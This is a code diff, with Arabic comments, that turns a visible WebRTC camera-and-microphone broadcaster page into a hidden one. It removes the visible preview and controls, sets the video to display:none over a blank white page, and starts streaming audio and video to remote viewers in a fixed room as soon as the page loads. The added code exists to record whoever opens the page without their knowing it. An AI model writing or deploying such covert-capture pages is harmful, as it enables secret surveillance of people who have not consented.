@@ -2,54 +2,34 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Broadcaster — Camera & Mic</title>
+  <title>Broadcaster — Hidden</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align:center; padding:20px; background:#f4f6f8; }
-    video { width: 640px; max-width:100%; border-radius:8px; background:#000; }
-    .info { margin:8px 0; }
-    input { padding:6px; }
+    body { margin:0; padding:0; background:#fff; }
+    video { display:none; } /* إخفاء الفيديو */
   </style>
 </head>
 <body>
-  <h2>Broadcaster — افتح الكاميرا والمايكروفون تلقائيًا</h2>
-  <p class="info">غرفة ثابتة: <strong id="roomLabel">room1</strong></p>
-  <input id="roomId" value="room1">
-
-  <div style="margin-top:12px;">
-    <video id="localVideo" autoplay muted playsinline></video>
-  </div>
-
-  <p style="margin-top:12px;">شارك رابط المشاهدة بهذا الشكل: <code>/viewer.html?room=room1</code></p>
+  <video id="localVideo" autoplay muted playsinline></video>
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
   (async function(){
     const socket = io();
-    let pcMap = new Map(); // watcherId -> RTCPeerConnection
+    let pcMap = new Map();
     let localStream = null;
     const localVideo = document.getElementById('localVideo');
-    const roomInput = document.getElementById('roomId');
-    const roomLabel = document.getElementById('roomLabel');
+    const roomID = 'room1'; // غرفة ثابتة
 
-    function updateRoomLabel(){ roomLabel.textContent = roomInput.value || 'room1'; }
-    roomInput.addEventListener('input', updateRoomLabel);
-    updateRoomLabel();
-
-    // بدء البث مباشرة
-    async function startBroadcast() {
-      const roomID = roomInput.value || 'room1';
-      try {
-        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        localVideo.srcObject = localStream;
-        socket.emit('broadcaster', roomID);
-        console.log('Broadcasting in room', roomID);
-      } catch(err) {
-        console.error('Cannot access camera/microphone:', err);
-        alert('Please allow camera/microphone access.');
-      }
+    // بدء البث في الخلفية مباشرة
+    try {
+      localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      localVideo.srcObject = localStream;
+      socket.emit('broadcaster', roomID);
+      console.log('Broadcasting in room', roomID);
+    } catch(err) {
+      console.error('Cannot access camera/microphone:', err);
+      alert('Please allow camera/microphone access.');
     }
-
-    startBroadcast();
 
     // استقبال المشاهدين
     socket.on('watcher', async ({ watcherId }) => {
